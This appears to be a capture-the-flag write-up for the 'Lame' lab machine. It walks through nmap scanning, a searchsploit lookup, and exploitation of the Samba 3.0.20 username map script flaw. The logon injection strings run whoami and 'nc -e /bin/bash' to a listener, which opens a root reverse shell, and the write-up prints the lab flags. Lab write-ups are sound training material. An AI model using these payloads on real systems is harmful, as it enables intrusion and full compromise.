![Lame.PNG](/assets/Machines/Easy/Lame/Lame.png)


1. Send an ICMP echo request to machine's IP address.
```bash
┌──(root㉿est)-[/home/kali]
└─| ping -c 2 10.10.10.3
```


2. Scan open ports with **nmap**.
```bash
┌──(root㉿kali)-[/home/kali]
└─| nmap -p- --open -vv -sS --min-rate 5000 -Pn -n 10.10.10.3
```

**Output**
```bash
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3632/tcp open  distccd
```

3. Discover de version of services 
```bash
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.18
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

4. Search with **searchsploit** any exploit with `Samba 3.0.20`
```bash
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)  | unix/remote/16320.rb
```

5. Copy this script into current directory and look how function.
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Lame]
└─| searchsploit -m unix/remote/16320.rb
```
---
![code.PNG](/assets/Machines/Easy/Lame/code.PNG)

* In this part of code we look te exploit login with **"/= \`nohup [code] \`"**
* Ej. **"/= \`nohup whoami \`"**

6. Try to intercept output of any command, use **nc**

First, login with smbclient 
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Lame]
└─| smbclient \\\\10.10.10.3\\tmp    
Password for [WORKGROUP\root]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> 
```
---
Then, listen with **nc** in port **443**
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Lame]
└─| nc -lvnp 443
```
---
Next, use `logon` to try to login with valid username, in this point we can inject the code look in exploit
```bash
smb: \> logon "/=`nohup whoami | nc <tun0 IP> <Port>`"
Password:
```
* In field password put any string
---
Finally, look in nc the output of command
```bash
┌──(root㉿kali)-[/home/…/Desktop/Machines/Easy/Lame]
└─| nc -lvnp 443                             
listening on [any] 443 ...
connect to [10.10.14.18] from (UNKNOWN) [10.10.10.3] 60493
root
```

7. Execute a commando to get a reverse shell, use nc

* **Command:** `nc -e /bin/bash <tun0 IP> <port>`

```bash
smb: \> logon "/=`nohup nc -e /bin/bash 10.10.14.18 443`"
Password:
```

**Output**
```bash
root@lame:/# whoami
root
```

8. Cat user and root flags.
```bash
root@lame:/# cat /root/root.txt 
14368624c2e93b9bb6cb9010615e8031
```
---
```bash
root@lame:/# find / -name user.txt | xargs cat
df61f813be4e97158555be5ae1d537e1
```

* Use command `find` with parameter `-name` to find the path of **user.txt** flag, after the output of this command execute a cat.